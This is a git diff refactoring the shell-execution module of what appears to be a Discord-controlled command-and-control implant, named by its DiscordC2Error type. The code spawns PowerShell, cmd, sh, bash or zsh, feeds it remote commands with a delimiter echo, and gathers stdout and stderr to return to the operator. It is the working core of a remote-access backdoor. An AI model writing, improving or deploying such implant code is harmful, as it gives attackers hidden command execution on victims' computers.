@@ -6,7 +6,7 @@ use std::{process::Stdio, sync::Arc};
 use std::path::Path;
 
 use tokio::{
-    io::{AsyncBufReadExt, AsyncWriteExt, BufReader},
+    io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader},
     process::{Child, Command},
     sync::Mutex,
     time::{timeout, Duration},
@@ -16,7 +16,7 @@ use lazy_static::lazy_static;
 
 #[cfg(target_os = "windows")]
 use regex::Regex;
-use tracing::{info, warn, error};
+use tracing::{error, info as informational, warn};
 
 #[derive(Clone, PartialEq, Eq, Debug, Copy)]
 pub enum ShellType {
@@ -28,7 +28,6 @@ pub enum ShellType {
 }
 
 impl ShellType {
-
     /// Returns a string representing the shell type.
     pub fn as_str(&self) -> &str {
         match self {
@@ -56,7 +55,7 @@ impl ShellType {
     /// * `handler` - A reference to the `ProcessHandler` instance.
     /// * `command` - The command to write to the standard input.
     ///
-    /// 
+    ///
     /// ### Returns
     ///
     /// `Ok(())` if the write operation is successful, or an error of type `DiscordC2Error` if there was a problem.
@@ -68,23 +67,6 @@ impl ShellType {
         let mut process = handler.process.lock().await;
 
         match self {
-            ShellType::Powershell => {
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all(command.as_bytes())
-                    .await?;
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all(b"; echo ___CMDDELIM___")
-                    .await?;
-                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
-                process.stdin.as_mut().unwrap().flush().await?;
-                Ok(())
-            }
             ShellType::Cmd => {
                 process
                     .stdin
@@ -102,41 +84,7 @@ impl ShellType {
                 process.stdin.as_mut().unwrap().flush().await?;
                 Ok(())
             }
-            ShellType::Sh => {
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all(command.as_bytes())
-                    .await?;
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all(b"; echo ___CMDDELIM___")
-                    .await?;
-                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
-                process.stdin.as_mut().unwrap().flush().await?;
-                Ok(())
-            }
-            ShellType::Bash => {
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all(command.as_bytes())
-                    .await?;
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all(b"; echo ___CMDDELIM___")
-                    .await?;
-                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
-                process.stdin.as_mut().unwrap().flush().await?;
-                Ok(())
-            }
-            ShellType::Zsh => {
+            _ => {
                 process
                     .stdin
                     .as_mut()
@@ -204,7 +152,7 @@ impl ShellType {
                 process.stdin.as_mut().unwrap().flush().await?;
                 Ok(ShellType::Cmd)
             }
-            ShellType::Sh => {
+            _ => {
                 process
                     .stdin
                     .as_mut()
@@ -220,40 +168,6 @@ impl ShellType {
                 process.stdin.as_mut().unwrap().write_all(b"\n").await?;
                 process.stdin.as_mut().unwrap().flush().await?;
                 Ok(ShellType::Sh)
-            }
-            ShellType::Bash => {
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all("cd".as_bytes())
-                    .await?;
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all(b"; echo ___CMDDELIM___")
-                    .await?;
-                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
-                process.stdin.as_mut().unwrap().flush().await?;
-                Ok(ShellType::Bash)
-            }
-            ShellType::Zsh => {
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all("cd".as_bytes())
-                    .await?;
-                process
-                    .stdin
-                    .as_mut()
-                    .unwrap()
-                    .write_all(b"; echo ___CMDDELIM___")
-                    .await?;
-                process.stdin.as_mut().unwrap().write_all(b"\n").await?;
-                process.stdin.as_mut().unwrap().flush().await?;
-                Ok(ShellType::Zsh)
             }
         };
 
@@ -288,7 +202,6 @@ pub struct ProcessHandler {
 
 //TODO: massive cleanup needs to be done here
 impl ProcessHandler {
-
     /// Returns true if the PROCESS_HANDLER static is instantiated (is some). False if otherwise.
     pub async fn is_instantiated() -> bool {
         let process_handler = PROCESS_HANDLER.lock().await;
@@ -300,7 +213,10 @@ impl ProcessHandler {
     async fn new(shell_type: ShellType) -> Result<Self, DiscordC2Error> {
         // Open a new shell process based on the provided `shell_type`
         let process = open_shell(shell_type).await?;
-        info!("Successfully instantiated a new shell of type: {}", shell_type.as_str());
+        informational!(
+            "Successfully instantiated a new shell of type: {}",
+            shell_type.as_str()
+        );
 
         // Create a new `ProcessHandler` instance with the shell type and the process wrapped in an `Arc<Mutex>`
         Ok(ProcessHandler {
@@ -334,23 +250,20 @@ impl ProcessHandler {
 
         async fn read_stderr(process: Arc<Mutex<Child>>) -> Option<String> {
             let mut process = process.lock().await;
-            let stderr_reader = BufReader::new(process.stderr.as_mut().unwrap());
-            let mut err_lines = stderr_reader.lines();
+            let stderr = process.stderr.as_mut().unwrap();
             let mut output = String::new();
 
-            // Have to find a better way to do this...
+            let mut buf = [0; 4096];
             loop {
-                match timeout(Duration::from_millis(10), err_lines.next_line()).await {
-                    Ok(line_result) => match line_result {
-                        Ok(Some(line)) => {
-                            if !line.is_empty() {
-                                output.push_str(&line);
-                                output.push('\n');
+                match timeout(Duration::from_millis(10), stderr.read(&mut buf)).await {
+                    Ok(read_result) => match read_result {
+                        Ok(bytes_read) => {
+                            if bytes_read > 0 {
+                                output.push_str(&String::from_utf8_lossy(&buf[..bytes_read]));
+                            } else {
+                                informational!("Stopped reading stderr");
+                                break;
                             }
-                        }
-                        Ok(None) => {
-                            info!("Stopped reading stderr");
-                            break;
                         }
                         Err(e) => {
                             error!("Error reading stderr: {}", e);
@@ -371,25 +284,27 @@ impl ProcessHandler {
             }
         }
 
-        let stderr = read_stderr(Arc::clone(&self.process)).await;
-     
-        let mut process = self.process.lock().await;
+        // This closure is necessary to release the process lock before reading stderr.
+        {
+            let mut process = self.process.lock().await;
 
-        // Read the process's stdout line by line
-        let stdout_reader = BufReader::new(process.stdout.as_mut().unwrap());
-        let mut out_lines = stdout_reader.lines();
+            // Read the process's stdout line by line
+            let stdout_reader = BufReader::new(process.stdout.as_mut().unwrap());
+            let mut out_lines = stdout_reader.lines();
 
-        while let Some(line) = out_lines.next_line().await? {
-            if !line.contains("echo") && line.contains("___CMDDELIM___") {
-                break;
+            while let Some(line) = out_lines.next_line().await? {
+                if !line.contains("echo") && line.contains("___CMDDELIM___") {
+                    break;
+                }
+                output.push_str(&line);
+                output.push('\n');
             }
-            output.push_str(&line);
-            output.push('\n');
         }
 
-        if stderr.is_some() {
-            output.push_str(stderr.unwrap().as_str());
-        }
+        // Push any stderr to the output if it exists
+        if let Some(stderr) = read_stderr(Arc::clone(&self.process)).await {
+            output.push_str(stderr.as_str());
+        };
 
         let formatted_output = self.shell_type.format_output(&output);
 
